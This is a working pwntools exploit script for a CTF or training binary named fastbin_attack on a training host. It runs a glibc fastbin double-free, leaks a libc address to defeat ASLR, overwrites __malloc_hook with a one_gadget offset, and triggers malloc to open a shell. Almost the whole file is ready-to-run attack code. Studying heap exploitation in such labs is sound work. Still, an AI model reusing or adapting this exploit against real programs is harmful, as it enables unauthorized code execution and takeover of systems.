#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 10101 fastbin_attack
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fastbin_attack')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 10101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./ld-2.23.so', '--library-path', '.', './fastbin_attack'] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

LEAK_OFFSET = 0x3c4b78
MALLOC_HOOK_OFFSET = 0x3c4b10
DELTA_HOOK = 0x23
MAGIC = 0xf1247
SIZE = 0x60

def alloc(c, size):
	c.recvuntil('> ')
	c.sendline('1')
	c.recvuntil('Size: ')
	c.sendline(str(size))

def write(c, index, data):
	c.recvuntil('> ')
	c.sendline('2')
	c.recvuntil('Index: ')
	c.sendline(str(index))
	c.recvuntil('Content: ')
	c.send(data)

def read(c, index):
	c.recvuntil('> ')
	c.sendline('3')
	c.recvuntil('Index: ')
	c.sendline(str(index))
	return c.recvuntil('\nOptions:').split(b'\nOptions:')[0]

def free(c, index):
	c.recvuntil('> ')
	c.sendline('4')
	c.recvuntil('Index: ')
	c.sendline(str(index))


# fastbin attack
alloc(io, SIZE) # 0
alloc(io, SIZE) # 1
free(io, 0)
free(io, 1)
free(io, 0)


# leak libc
alloc(io, 0xA0) # 2
alloc(io, 0x20) # 3
free(io, 2)
leak = read(io, 2)
leak = u64(leak.ljust(8, b'\x00'))
libc_base = leak - LEAK_OFFSET

print('Libc base: ' + hex(libc_base))

# Write malloc hook
alloc(io, SIZE) # 4
alloc(io, SIZE) # 5
write(io, 4, p64(libc_base + MALLOC_HOOK_OFFSET - DELTA_HOOK))
alloc(io, SIZE) # 6

alloc(io, SIZE) # 7
payload = b'A' * (DELTA_HOOK - 0x10)
payload += p64(libc_base + MAGIC)
write(io, 7, payload)

alloc(io, SIZE) # call malloc hook and open bash

io.interactive()

